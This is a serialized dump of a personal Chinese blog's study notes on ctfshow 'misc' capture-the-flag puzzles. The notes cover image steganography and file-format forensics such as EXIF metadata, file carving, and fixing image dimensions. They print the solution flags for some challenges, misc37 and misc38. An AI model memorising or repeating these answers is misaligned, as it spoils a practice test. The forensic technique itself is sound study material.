misc22![image-20230529165931825](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291659871.png)\r\n\r\n> 这道题是先用exiftool查看文件信息\r\n\r\n> 发现最后一行有thumbnail image 代表这张图片是有缩略图的\r\n\r\n> 使用命令进行分离缩略图\r\n\r\n![image-20230529170045544](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291700576.png)\r\n\r\n> [如果不懂exiftool有啥参数能用看这](https://www.32r.com/soft/86104.html)\r\n\r\n> 另一个方法\r\n\r\n> 使用magicexif也能直接查看缩略图信息\r\n\r\n![image-20230529170140988](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291701026.png)\r\n\r\n![image-20230529170201419](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291702455.png)\r\n\r\n### misc23\r\n\r\n> 这道题涉及了时间戳隐写\r\n\r\n> 首先exiftool查看文件的具体信息，发现多了四个时间信息，而且这个时间信息非常异常，不符合正常逻辑，所以得想到时间戳隐写\r\n\r\n![image-20230529170207389](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291702431.png)\r\n\r\n> 时间戳是1970年的一月一日到所在时间的总秒数所以求出四个时间戳然后hex得到其flag值\r\n\r\n![image-20230529170218838](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291702878.png)\r\n\r\n41\r\n\r\n![image-20230529170425260](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291704315.png)\r\n\r\n这道题就是十六进制结合了图像隐写，将flag值隐藏于f001 组合的图像中\r\n\r\n属于长见识的一道题\r\n\r\n \r\n\r\n \r\n\r\n## 信息附加的总结：\r\n\r\n> 做这类题目时首先查看文件类型，通过一些特殊的文件打开器打开 例如bpg文件可以用bpgview.exe打开  如果能直接打开最好，一些就是直接放在图片里的，当然这种情况虽少但不是没有。补充，有的照片会藏在缩略图里了，在exiftool查看时会告诉，当然也可以用exif元图片查看器查看。\r\n\r\n>    其次，查看文件的详细属性，这里可以Windows下直接在属性里看，当然也可用linux里的exiftool 直接查看，这边推荐直接用第二种方式 直接，方便。此步骤是看看详细内容中有没有一些信息，留意一些奇奇怪怪的属性，比如啥照片会有xy坐标信息的，啥照片会有奇奇怪怪的时间戳的，留意就行。\r\n\r\n> ​\t然后就是对文件内容进行查看了，常规就是拖入winhex或者010editor查看 当然也可以在linux用hexdump命令查看，有的是会放在ASCII码中，有的就会放在16进制编码中，比如就像愚人节那道题41，常规先ctrl +F搜索一遍，加上对一些文件头文件尾进行查询，如果有那么要进行分离，这边可以foremost文件分离，或者使用binwalk+dd命令进行分离。这里补充binwalk查看的是文件块，就是文件头到文件尾的那种，对于png图片文件，也可以用tweakpng，这类题目一般是对图片idat块增加删除，从而改变图片文件，开F7预览从上至下删除idat文件块就行。\r\n\r\n> 对于文件隐写，直接用zsteg检测就完事了，会给出隐写内容\r\n\r\n \r\n\r\n',contentRendered:'<h1 id="misc刷题-信息附加" tabindex="-1"><a class="header-anchor" href="#misc刷题-信息附加" aria-hidden="true">#</a> misc刷题（信息附加）</h1>\n<h2 id="信息附加" tabindex="-1"><a class="header-anchor" href="#信息附加" aria-hidden="true">#</a> 信息附加</h2>\n<h3 id="misc3" tabindex="-1"><a class="header-anchor" href="#misc3" aria-hidden="true">#</a> Misc3</h3>\n<blockquote>\n<p>Bpgview.exe 的使用 当文件后缀是bpg使用</p>\n</blockquote>\n<blockquote>\n<img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251822927.png" style="zoom:50%;" />\n</blockquote>\n<h3 id="misc5" tabindex="-1"><a class="header-anchor" href="#misc5" aria-hidden="true">#</a> misc5</h3>\n<blockquote>\n<p>图片隐写</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251825792.png" data="aurora"></p>\n</blockquote>\n<h3 id="misc6" tabindex="-1"><a class="header-anchor" href="#misc6" aria-hidden="true">#</a> misc6</h3>\n<p>同理</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251825010.png" data="aurora"></p>\n<h3 id="misc7" tabindex="-1"><a class="header-anchor" href="#misc7" aria-hidden="true">#</a> misc7</h3>\n<blockquote>\n<p>同理 不放照片了</p>\n</blockquote>\n<h3 id="misc8" tabindex="-1"><a class="header-anchor" href="#misc8" aria-hidden="true">#</a> misc8</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251825199.png" data="aurora"></p>\n<blockquote>\n<p>使用foremost分离图片</p>\n</blockquote>\n<blockquote>\n<p>方法<a href="https://blog.csdn.net/john_david_/article/details/87273152" target="_blank" rel="noopener noreferrer">foremost使用简介<ExternalLinkIcon/></a></p>\n</blockquote>\n<h3 id="misc9" tabindex="-1"><a class="header-anchor" href="#misc9" aria-hidden="true">#</a> misc9</h3>\n<blockquote>\n<p>用winhex查找</p>\n</blockquote>\n<h3 id="misc10" tabindex="-1"><a class="header-anchor" href="#misc10" aria-hidden="true">#</a> misc10</h3>\n<blockquote>\n<p>图片文件的分离</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251826495.png" data="aurora"><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251826104.png" data="aurora"></p>\n<blockquote>\n<p>根据提示搞 要将runas=root</p>\n</blockquote>\n<h3 id="misc11" tabindex="-1"><a class="header-anchor" href="#misc11" aria-hidden="true">#</a> misc11</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230525182748221" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251827268.png" data="aurora"></p>\n<blockquote>\n<p>利用tweakpng 对png文件idat（数据）对图片内容改写</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230525182805387" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251828423.png" data="aurora"></p>\n<blockquote>\n<p>删除不同的数据块所获得的内容也不同</p>\n</blockquote>\n<h3 id="misc12" tabindex="-1"><a class="header-anchor" href="#misc12" aria-hidden="true">#</a> misc12</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230525182820884" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251828925.png" data="aurora"></p>\n<blockquote>\n<p>按f7预览</p>\n</blockquote>\n<blockquote>\n<p>从头逐个删除idat直至出现</p>\n</blockquote>\n<blockquote>\n<p>具体原因不清楚   idat的length应该是一样的 常规删除不一样的</p>\n</blockquote>\n<h3 id="misc13" tabindex="-1"><a class="header-anchor" href="#misc13" aria-hidden="true">#</a> misc13</h3>\n<blockquote>\n<p>抽象的题目</p>\n</blockquote>\n<blockquote>\n<p>图片用winhex打开图片 发现有类似flag的东西？</p>\n</blockquote>\n<blockquote>\n<p>然后分析一个间隔一个的出现</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230525182858447" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251828483.png" data="aurora"></p>\n</blockquote>\n<blockquote>\n<p>那么将十六进制转化为byte类型再用切片提取flag</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230525182939765" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251829795.png" data="aurora"></p>\n<h3 id="misc14" tabindex="-1"><a class="header-anchor" href="#misc14" aria-hidden="true">#</a> misc14</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230525182953629" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251829665.png" data="aurora"></p>\n<blockquote>\n<p>Binwalk查看整个文件的块内容</p>\n</blockquote>\n<blockquote>\n<p>可以发现发现 有四个文件块</p>\n</blockquote>\n<blockquote>\n<p>用dd命令进行分解 dd if=源文件 of=输出文件 skip=跳过的大小 count=提取文件的大小 bs=块大小 这边DECIMAL 是指的上一个文件的大小</p>\n</blockquote>\n<blockquote>\n<p>应该先查看文件的类型然后 对对应的文件进行分离</p>\n</blockquote>\n<h3 id="misc15" tabindex="-1"><a class="header-anchor" href="#misc15" aria-hidden="true">#</a> misc15</h3>\n<blockquote>\n<p>用winhex查找</p>\n</blockquote>\n<p>无图.jpg</p>\n<h3 id="misc16" tabindex="-1"><a class="header-anchor" href="#misc16" aria-hidden="true">#</a> misc16</h3>\n<blockquote>\n<p>用binwalk进行分离 得到文件夹下里面寻找</p>\n</blockquote>\n<p>再次无图.jpg</p>\n<h3 id="misc17" tabindex="-1"><a class="header-anchor" href="#misc17" aria-hidden="true">#</a> misc17</h3>\n<blockquote>\n<p>新工具的使用 zsteg 此工具可以对png 和bmp文件中隐写的数据进行分离</p>\n</blockquote>\n<blockquote>\n<p><a href="https://blog.csdn.net/weixin_52941926/article/details/121536324" target="_blank" rel="noopener noreferrer">zsteg使用方法<ExternalLinkIcon/></a></p>\n</blockquote>\n<blockquote>\n<p>建议以后如果不会好好看</p>\n</blockquote>\n<blockquote>\n<p>可以先使用zsteg &lt;文件名&gt; --all 查看所有组合</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230526161238348" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305261612400.png" data="aurora"></p>\n<blockquote>\n<p>这边发现是只有extradata:0模式下有隐藏内容</p>\n</blockquote>\n<blockquote>\n<p>所以对此进行分离</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230526161256254" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305261612289.png" data="aurora"></p>\n<blockquote>\n<p>然后打开发现是乱码 然后就查答案 发现可以binwalk再次进行分离</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230526161300816" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305261613849.png" data="aurora"></p>\n<blockquote>\n<p>然后就分离出来了</p>\n</blockquote>\n<h3 id="misc18" tabindex="-1"><a class="header-anchor" href="#misc18" aria-hidden="true">#</a> misc18</h3>\n<blockquote>\n<p>藏在详细信息里</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529165153643" originSrc="C:/Users/23167/AppData/Roaming/Typora/typora-user-images/image-20230529165153643.png" data="aurora"></p>\n<blockquote>\n<p>就没啥好说的，多留意就行</p>\n</blockquote>\n<h3 id="misc19" tabindex="-1"><a class="header-anchor" href="#misc19" aria-hidden="true">#</a> misc19</h3>\n<blockquote>\n<p>使用新工具exiftool查看图片的详细内容</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529165312013" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291653062.png" data="aurora"></p>\n<blockquote>\n<p>使用exiftool能看到一些隐藏的参数，所以这道隐写题 将flag放于document name 和host nname中</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529165521755" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291655788.png" data="aurora"></p>\n<blockquote>\n<p>那么同理 18题的也可以用这个工具查看</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529165534249" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291655301.png" data="aurora"></p>\n<h3 id="misc20" tabindex="-1"><a class="header-anchor" href="#misc20" aria-hidden="true">#</a> misc20</h3>\n<blockquote>\n<p>还是用exiftool查看文件信息</p>\n</blockquote>\n<blockquote>\n<p>发现在comment里有文字隐写</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529165555621" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291655652.png" data="aurora"></p>\n<h3 id="misc21" tabindex="-1"><a class="header-anchor" href="#misc21" aria-hidden="true">#</a> misc21<img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529165632408" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291656458.png" data="aurora"></h3>\n<blockquote>\n<p>题目给出的提示是要在序号里找</p>\n</blockquote>\n<blockquote>\n<p>但是唯一一个serial number很显然不符合flag格式</p>\n</blockquote>\n<blockquote>\n<p>这时发现有四段xy信息是一串长度相同的数字</p>\n</blockquote>\n<blockquote>\n<p>第一个想法就是连起来然后去拿十六进制，但是不对，后来尝试一段一段转化就得到了</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529165900646" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291659679.png" data="aurora"></p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529165926034" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291659067.png" data="aurora"></p>\n</blockquote>\n<h3 id="misc22" tabindex="-1"><a class="header-anchor" href="#misc22" aria-hidden="true">#</a> misc22<img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529165931825" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291659871.png" data="aurora"></h3>\n<blockquote>\n<p>这道题是先用exiftool查看文件信息</p>\n</blockquote>\n<blockquote>\n<p>发现最后一行有thumbnail image 代表这张图片是有缩略图的</p>\n</blockquote>\n<blockquote>\n<p>使用命令进行分离缩略图</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529170045544" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291700576.png" data="aurora"></p>\n<blockquote>\n<p><a href="https://www.32r.com/soft/86104.html" target="_blank" rel="noopener noreferrer">如果不懂exiftool有啥参数能用看这<ExternalLinkIcon/></a></p>\n</blockquote>\n<blockquote>\n<p>另一个方法</p>\n</blockquote>\n<blockquote>\n<p>使用magicexif也能直接查看缩略图信息</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529170140988" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291701026.png" data="aurora"></p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529170201419" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291702455.png" data="aurora"></p>\n<h3 id="misc23" tabindex="-1"><a class="header-anchor" href="#misc23" aria-hidden="true">#</a> misc23</h3>\n<blockquote>\n<p>这道题涉及了时间戳隐写</p>\n</blockquote>\n<blockquote>\n<p>首先exiftool查看文件的具体信息，发现多了四个时间信息，而且这个时间信息非常异常，不符合正常逻辑，所以得想到时间戳隐写</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529170207389" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291702431.png" data="aurora"></p>\n<blockquote>\n<p>时间戳是1970年的一月一日到所在时间的总秒数所以求出四个时间戳然后hex得到其flag值</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529170218838" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291702878.png" data="aurora"></p>\n<p>41</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529170425260" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291704315.png" data="aurora"></p>\n<p>这道题就是十六进制结合了图像隐写，将flag值隐藏于f001 组合的图像中</p>\n<p>属于长见识的一道题</p>\n<h2 id="信息附加的总结" tabindex="-1"><a class="header-anchor" href="#信息附加的总结" aria-hidden="true">#</a> 信息附加的总结：</h2>\n<blockquote>\n<p>做这类题目时首先查看文件类型，通过一些特殊的文件打开器打开 例如bpg文件可以用bpgview.exe打开  如果能直接打开最好，一些就是直接放在图片里的，当然这种情况虽少但不是没有。补充，有的照片会藏在缩略图里了，在exiftool查看时会告诉，当然也可以用exif元图片查看器查看。</p>\n</blockquote>\n<blockquote>\n<p>其次，查看文件的详细属性，这里可以Windows下直接在属性里看，当然也可用linux里的exiftool 直接查看，这边推荐直接用第二种方式 直接，方便。此步骤是看看详细内容中有没有一些信息，留意一些奇奇怪怪的属性，比如啥照片会有xy坐标信息的，啥照片会有奇奇怪怪的时间戳的，留意就行。</p>\n</blockquote>\n<blockquote>\n<p>​\t然后就是对文件内容进行查看了，常规就是拖入winhex或者010editor查看 当然也可以在linux用hexdump命令查看，有的是会放在ASCII码中，有的就会放在16进制编码中，比如就像愚人节那道题41，常规先ctrl +F搜索一遍，加上对一些文件头文件尾进行查询，如果有那么要进行分离，这边可以foremost文件分离，或者使用binwalk+dd命令进行分离。这里补充binwalk查看的是文件块，就是文件头到文件尾的那种，对于png图片文件，也可以用tweakpng，这类题目一般是对图片idat块增加删除，从而改变图片文件，开F7预览从上至下删除idat文件块就行。</p>\n</blockquote>\n<blockquote>\n<p>对于文件隐写，直接用zsteg检测就完事了，会给出隐写内容</p>\n</blockquote>\n',date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:"/misc/misc1.html",pathLocale:"/",permalink:null,routeMeta:{},slug:"misc1",filePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/misc/misc1.md",filePathRelative:"misc/misc1.md",componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/misc/misc1.html.vue",componentFilePathRelative:"pages/misc/misc1.html.vue",componentFileChunkName:"v-7c00b81e",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/misc/misc1.html.js",dataFilePathRelative:"pages/misc/misc1.html.js",dataFileChunkName:"v-7c00b81e",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/misc/misc1.html",htmlFilePathRelative:"misc/misc1.html"},{data:{key:"v-7db590bd",path:"/misc/misc2.html",title:"misc刷题（文件结构）",lang:"zh-CN",frontmatter:{date:"2023/5/29 17:15",stick:!1,keyword:"misc,ctfshow",description:"刷题",title:"misc刷题（文件结构）",tag:["ctfshow刷题"],categories:["文件结构","歪比八卜"]},excerpt:"",headers:[{level:2,title:"文件结构",slug:"文件结构",children:[{level:3,title:"misc24",slug:"misc24",children:[]},{level:3,title:"misc25",slug:"misc25",children:[]},{level:3,title:"misc26",slug:"misc26",children:[]},{level:3,title:"misc27",slug:"misc27",children:[]},{level:3,title:"misc28",slug:"misc28",children:[]},{level:3,title:"misc29",slug:"misc29",children:[]},{level:3,title:"misc30",slug:"misc30",children:[]},{level:3,title:"misc31",slug:"misc31",children:[]},{level:3,title:"misc32",slug:"misc32",children:[]},{level:3,title:"misc33",slug:"misc33",children:[]},{level:3,title:"misc34",slug:"misc34",children:[]},{level:3,title:"miscc35",slug:"miscc35",children:[]},{level:3,title:"misc36",slug:"misc36",children:[]},{level:3,title:"misc37",slug:"misc37",children:[]},{level:3,title:"misc38",slug:"misc38",children:[]},{level:3,title:"misc39",slug:"misc39",children:[]}]}],git:{}},key:"v-7db590bd",path:"/misc/misc2.html",title:"misc刷题（文件结构）",lang:"zh-CN",frontmatter:{date:"2023/5/29 17:15",stick:!1,keyword:"misc,ctfshow",description:"刷题",title:"misc刷题（文件结构）",tag:["ctfshow刷题"],categories:["文件结构","歪比八卜"]},excerpt:"",headers:[{level:2,title:"文件结构",slug:"文件结构",children:[{level:3,title:"misc24",slug:"misc24",children:[]},{level:3,title:"misc25",slug:"misc25",children:[]},{level:3,title:"misc26",slug:"misc26",children:[]},{level:3,title:"misc27",slug:"misc27",children:[]},{level:3,title:"misc28",slug:"misc28",children:[]},{level:3,title:"misc29",slug:"misc29",children:[]},{level:3,title:"misc30",slug:"misc30",children:[]},{level:3,title:"misc31",slug:"misc31",children:[]},{level:3,title:"misc32",slug:"misc32",children:[]},{level:3,title:"misc33",slug:"misc33",children:[]},{level:3,title:"misc34",slug:"misc34",children:[]},{level:3,title:"miscc35",slug:"miscc35",children:[]},{level:3,title:"misc36",slug:"misc36",children:[]},{level:3,title:"misc37",slug:"misc37",children:[]},{level:3,title:"misc38",slug:"misc38",children:[]},{level:3,title:"misc39",slug:"misc39",children:[]}]}],content:"\r\n## 文件结构\r\n\r\n### misc24\r\n\r\n> 考察了bmp文件头和文件体\r\n\r\n> **[bmp文件详解](https://blog.csdn.net/whl0071/article/details/126976920)**\r\n\r\n> bmp文件头是以位图格式：424d 然后其他的参数都是从后往前读的 具体看下图\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291717695.jpg)\r\n\r\n> 注意像素是文件体的字节数/3 （三原色）像素也等于图像宽×图像高 这道题是图像的长×高不对，提示是**flag****在图片上面。****宽是对的，根据像素推导高，然后在位图里改，最后导出就好**\r\n\r\n### misc25\r\n\r\n> 考察png文件格式\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291717699.jpg)\r\n\r\n> **Png有crc校验** \r\n\r\n> 图片的[crc校验](https://so.csdn.net/so/search?q=crc校验&spm=1001.2101.3001.7020)值由从第12个字节到第28个字节的十七位字节进行crc计算得到\r\n\r\n> 所以拿到png图的题时应当先校验crc\r\n\r\n> 49 48 44 52 00 00 03 84 00 00 00 96 08 02 00 00 00\r\n\r\n> 这里使用脚本去根据crc校验值去爆破图像的宽高(脚本都在test.py中)\r\n\r\n### misc26\r\n\r\n> Png文件同25题去跑脚本\r\n\r\n### misc27\r\n\r\n> 考点时jpg文件格式 这个参考\r\n\r\n> **[jpg文件格式](https://blog.csdn.net/weixin_40673765/article/details/118786341)**               ![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291717712.gif)\r\n\r\n\r\n\r\n> Jpg文件宽高是在4中 所以需要修改宽高时可以直接查找FFC0 6-7位是高 8-9位是宽\r\n\r\n> 当什么提示flag在下面上面就修改高 宽看题目意思修改\r\n\r\n> ***Jpg的宽高是先高后宽*** \r\n\r\n> 在第四块区域中0008 0008 是高和宽 注意要倒着看\r\n\r\n### misc28\r\n\r\n> [GIF 字节格式](https://www.jianshu.com/p/4fabac6b15b3)\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291717050.gif)\r\n\r\n> 474946383961 文件头后是宽高 \r\n\r\n> **注意点** 还有 Image Seperator里的下一帧宽高也需要改\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291717123.gif)\r\n\r\n> 这里插一句 gif动图是一帧一帧图片结合起来的 所以每一帧动图都会有Graphics Control Extension 和 Image Descriptor 9021 F9 04 01 32 00 02 00 2C 00 00 00 00 84 03 96 00 87\r\n\r\n> 所以呢 改图片需要将整合图片的宽高和每一帧的宽高都要一起改\r\n\r\n> 我直接搜索相同宽高一起改就完事了（跟bmp图片文件一样 宽高是倒的 倒着读就行）\r\n\r\n> 这里引入stegsolve 图片查看器 \r\n\r\n### misc29\r\n\r\n> 也是gif文件格式 根据题目修改高 记得每一帧的高都要修改\r\n\r\n> 保存以后发现是一张动图，这里就用到了stegsolve工具 analyse模块中frame browser （动图帧格式预览）一帧一帧查看 就获得了 \r\n\r\n### misc30\r\n\r\n> 还是bmp图片格式 所以按照题目要求修改 宽度950 （3B6）就行 注意得倒着写\r\n\r\n### misc31\r\n\r\n> Bmp图片格式 按照要求高度是对的 修改宽度 根据字节数手搓宽度 注意字节数得除以3才得到像素，因为三原色 但是求解的宽度不是整数需要向下取整\r\n\r\n### misc32\r\n\r\n> 考察了png 的crc检验 把文件放到脚本里去跑得出宽和高\r\n\r\n### misc33\r\n\r\n> 和上题一样 跑脚本\r\n\r\n### misc34\r\n\r\n> 根据提示用脚本遍历宽度就行 \r\n\r\n### miscc35\r\n\r\n> 不能理解为什么高度也会被改掉\r\n\r\n> 那么既然改了为什么高度是600\r\n\r\n> 那如果遍历高度和宽度呢\r\n\r\n> 发现数据量过于庞大 然后上网搜了下 如何批量检测损坏文件\r\n\r\n> 引入imghdr库 但是跑出来的甚至是修改好的 也是被检测出来是损坏的 本来题目给的就是损坏文件\r\n\r\n这道题\r\n\r\n这边跑脚本的时候注意 宽高所占的字节数 一个十六进制字母占到0.5个字节 一般这个位置是2-4个字节 如果2个字节的话要用短整型（h） 如果4个字节的话要用整型（i）struct.pack('>h',i)如果像bmp是倒着写的可以[::-1]\r\n\r\n### misc36\r\n\r\n> 和上一道同理，如果出现有图像但是不是所需要的图像可以考虑改大图片的高，或许就有用呢，一般高度改了确实能隐藏，跑的脚本在文件下。\r\n\r\n### misc37\r\n\r\n> 打开文件是发现是动图，提示也是flag在图片里所以gif一张一张分离，用stegsolve analyse frame browser ctfshow{2056782cd57b13261dcbbe3d6eecda17}\r\n\r\n### misc38\r\n\r\n> 提示是还是flag在图片里，打开后发现是个png文件，看了wp以后才知道这个提示是要先png转到gif格式  工具[png转gif工具](https://cdkm.com/cn/png-to-gif) 然后和上一题同样操作就行了\r\n\r\nctfshow{48b722b570c603ef58cc0b83bbf7680d}\r\n\r\n> 使用apngdis.exe（APNG Disassembler）工具分离文件也可\r\n\r\n \r\n\r\n### misc39\r\n\r\n> 提示是flag如流水，图片帧间隔时间隐写，identify -format \"%T \" misc39.gif > 1.txt\r\n\r\n> 这个实在看不懂了网上找吧\r\n\r\n> flag一般是32位的加上格式是41位，\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291717268.gif)\r\n\r\n> 可以看到3637循环，可以想到01二进制循环，第一位是37 所以37为1，36为0\r\n\r\n> 转化为287，287 /41=7 所以7位为一组，转化字符串类型 然后flag就是转化后的字符串",contentRendered:'<h2 id="文件结构" tabindex="-1"><a class="header-anchor" href="#文件结构" aria-hidden="true">#</a> 文件结构</h2>\n<h3 id="misc24" tabindex="-1"><a class="header-anchor" href="#misc24" aria-hidden="true">#</a> misc24</h3>\n<blockquote>\n<p>考察了bmp文件头和文件体</p>\n</blockquote>\n<blockquote>\n<p><strong><a href="https://blog.csdn.net/whl0071/article/details/126976920" target="_blank" rel="noopener noreferrer">bmp文件详解<ExternalLinkIcon/></a></strong></p>\n</blockquote>\n<blockquote>\n<p>bmp文件头是以位图格式：424d 然后其他的参数都是从后往前读的 具体看下图</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291717695.jpg" data="aurora"></p>\n<blockquote>\n<p>注意像素是文件体的字节数/3 （三原色）像素也等于图像宽×图像高 这道题是图像的长×高不对，提示是**flag****在图片上面。**<strong>宽是对的，根据像素推导高，然后在位图里改，最后导出就好</strong></p>\n</blockquote>\n<h3 id="misc25" tabindex="-1"><a class="header-anchor" href="#misc25" aria-hidden="true">#</a> misc25</h3>\n<blockquote>\n<p>考察png文件格式</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291717699.jpg" data="aurora"></p>\n<blockquote>\n<p><strong>Png有crc校验</strong></p>\n</blockquote>\n<blockquote>\n<p>图片的<a href="https://so.csdn.net/so/search?q=crc%E6%A0%A1%E9%AA%8C&amp;spm=1001.2101.3001.7020" target="_blank" rel="noopener noreferrer">crc校验<ExternalLinkIcon/></a>值由从第12个字节到第28个字节的十七位字节进行crc计算得到</p>\n</blockquote>\n<blockquote>\n<p>所以拿到png图的题时应当先校验crc</p>\n</blockquote>\n<blockquote>\n<p>49 48 44 52 00 00 03 84 00 00 00 96 08 02 00 00 00</p>\n</blockquote>\n<blockquote>\n<p>这里使用脚本去根据crc校验值去爆破图像的宽高(脚本都在test.py中)</p>\n</blockquote>\n<h3 id="misc26" tabindex="-1"><a class="header-anchor" href="#misc26" aria-hidden="true">#</a> misc26</h3>\n<blockquote>\n<p>Png文件同25题去跑脚本</p>\n</blockquote>\n<h3 id="misc27" tabindex="-1"><a class="header-anchor" href="#misc27" aria-hidden="true">#</a> misc27</h3>\n<blockquote>\n<p>考点时jpg文件格式 这个参考</p>\n</blockquote>\n<blockquote>\n<p><strong><a href="https://blog.csdn.net/weixin_40673765/article/details/118786341" target="_blank" rel="noopener noreferrer">jpg文件格式<ExternalLinkIcon/></a></strong>               <img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291717712.gif" data="aurora"></p>\n</blockquote>\n<blockquote>\n<p>Jpg文件宽高是在4中 所以需要修改宽高时可以直接查找FFC0 6-7位是高 8-9位是宽</p>\n</blockquote>\n<blockquote>\n<p>当什么提示flag在下面上面就修改高 宽看题目意思修改</p>\n</blockquote>\n<blockquote>\n<p><em><strong>Jpg的宽高是先高后宽</strong></em></p>\n</blockquote>\n<blockquote>\n<p>在第四块区域中0008 0008 是高和宽 注意要倒着看</p>\n</blockquote>\n<h3 id="misc28" tabindex="-1"><a class="header-anchor" href="#misc28" aria-hidden="true">#</a> misc28</h3>\n<blockquote>\n<p><a 